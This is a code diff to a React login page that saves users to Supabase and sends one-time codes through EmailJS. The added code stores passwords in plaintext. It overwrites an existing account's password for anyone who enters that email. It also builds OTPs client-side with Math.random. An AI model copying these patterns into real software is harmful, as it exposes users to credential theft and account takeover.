@@ -25,38 +25,75 @@ export default function Login() {
       setStep(2);
     } else if (step === 2 && password) {
       // Save to Supabase users table
-      const { data: existingUser } = await supabase
+      const { data: existingUser, error } = await supabase
         .from("users")
         .select("*")
         .eq("email", email)
-        .single();
+        .maybeSingle();
+
+      if (error) {
+        console.error("Error checking user:", error.message);
+        alert("Something went wrong checking the user.");
+        return;
+      }
 
       if (!existingUser) {
-        await supabase.from("users").insert([{ email, password }]);
+        // Insert new user with password
+        const { error: insertError } = await supabase
+          .from("users")
+          .insert([{ email, password }]);
+        if (insertError) {
+          console.error("Insert error:", insertError.message);
+          alert("Failed to save user.");
+          return;
+        }
+      } else {
+        // Update password if user already exists
+        const { error: updateError } = await supabase
+          .from("users")
+          .update({ password })
+          .eq("email", email);
+        if (updateError) {
+          console.error("Update error:", updateError.message);
+          alert("Failed to update password.");
+          return;
+        }
       }
 
       // Generate OTP
       const newCode = Math.floor(100000 + Math.random() * 900000).toString();
       const expiryTime = new Date(Date.now() + 15 * 60 * 1000);
 
-      await supabase.from("otps").insert([
+      const { error: otpError } = await supabase.from("otps").insert([
         { email, code: newCode, expires_at: expiryTime.toISOString() },
       ]);
 
+      if (otpError) {
+        console.error("OTP insert error:", otpError.message);
+        alert("Failed to generate OTP.");
+        return;
+      }
+
       // Send OTP via EmailJS
-      await emailjs.send(
-        "service_pn1ecn9",
-        "template_xqsd4l8",
-        {
-          email: email,
-          passcode: newCode,
-          time: expiryTime.toLocaleTimeString([], {
-            hour: "2-digit",
-            minute: "2-digit",
-          }),
-        },
-        "B3qq_r0cNoHULpzEV"
-      );
+      try {
+        await emailjs.send(
+          "service_pn1ecn9",
+          "template_xqsd4l8",
+          {
+            email: email,
+            passcode: newCode,
+            time: expiryTime.toLocaleTimeString([], {
+              hour: "2-digit",
+              minute: "2-digit",
+            }),
+          },
+          "B3qq_r0cNoHULpzEV"
+        );
+      } catch (err) {
+        console.error("EmailJS error:", err);
+        alert("Failed to send OTP.");
+        return;
+      }
 
       navigate("/verify", { state: { email } });
     }
